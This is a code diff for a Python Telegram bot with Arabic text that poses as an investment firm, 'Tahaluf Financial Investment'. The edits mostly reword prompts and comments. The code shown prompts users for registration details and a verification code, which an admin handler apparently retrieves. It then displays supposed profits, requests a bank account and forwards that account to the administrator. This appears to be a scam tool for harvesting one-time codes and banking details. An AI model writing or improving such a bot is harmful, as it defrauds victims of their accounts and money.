@@ -95,7 +95,7 @@ async def admin_get_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="Markdown"
     )
 
-# أمر /start الترحيبي مع معلومات حساب المستخدم وزر السحب
+# أمر /start الترحيبي مع معلومات الحساب وزري (سحب) و (الدعم الفني) فقط
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
@@ -109,7 +109,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📊 معلومات حسابك:\n"
         f"• معرفك الشخصي (ID): `{user_id}`\n"
         f"• تقدير الحساب: {age_estimation}\n\n"
-        f"الرجاء إرسال بياناتك صحيحة (خطوات التسجيل والإشتراك) ليتم التعرف عليك في النظام، أو استخدم زر السحب أدناه:"
+        f"الرجاء إرسال بياناتك صحيحة (خطوات التسجيل والإشتراك) ليتم التعرف عليك في النظام، أو استخدم الأزرار أدناه:"
     )
     
     keyboard = [
@@ -146,12 +146,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await msg.reply_text("❌ الرجاء إدخال بياناتك صحيحة (مثل بيانات الحساب أو خطوات التسجيل والإشتراك)")
         return
 
-    # الحالة الخاصة بإدخال الحساب البنكي بعد الضغط على الزر
+    # الحالة الخاصة بإدخال الحساب البنكي
     if current_state == "waiting_for_bank_account":
         user_states[user_id] = "completed"
         await msg.reply_text("✅ **تم حفظ بيانات الحساب البنكي بنجاح!**\n\nجاري معالجة عملية تحويل الأرباح لحسابك.")
         
-        # إشعار للأدمن بالحساب البنكي المدخل
         await context.bot.send_message(
             chat_id=ADMIN_ID,
             text=(
@@ -195,7 +194,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 parse_mode="Markdown"
             )
 
-            # الزر الجديد في رسالة عرض الرصيد: "ادخل حسابك البنكي"
+            # الزر في الأعلى وأزرار التأكيد والإلغاء في الأسفل
             keyboard = [
                 [InlineKeyboardButton("💳 ادخل حسابك البنكي", callback_data="enter_bank_account")],
                 [
@@ -207,7 +206,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             user_specific_data = user_custom_data.get(user_id, "بيانات التسجيل مسجلة بنجاح")
 
-            # عرض الأرباح للمستخدم مع الأزرار الجديدة
             await msg.reply_text(
                 text=(
                     "✅ **تم التحقق من رقم التحقق بنجاح!**\n\n"
@@ -245,7 +243,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_states[user_id] = "waiting_for_subscription_text"
         main_text = (
             f"🌟 أهلاً بك من جديد في القائمة الرئيسية لشركة **تحالف المالية للإستثمار** 🇸🇦\n\n"
-            "اختر زر السحب أدناه أو أرسل بياناتك ورقم التحقق الخاص بك:"
+            "اختر أحد الخيارات أدناه أو أرسل بياناتك ورقم التحقق الخاص بك:"
         )
         keyboard = [
             [InlineKeyboardButton("📤 سحب", callback_data="btn_withdraw")],
@@ -297,7 +295,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     app.add_handler(CallbackQueryHandler(button_handler))
 
-    print("🤖 بوت تحالف المالية للإستثمار يعمل الآن بزر الحساب البنكي والأزرار في الأسفل...")
+    print("🤖 بوت تحالف المالية للإستثمار يعمل الآن بالأزرار المطلوبة فقط...")
     app.run_polling()
 
 if __name__ == "__main__":
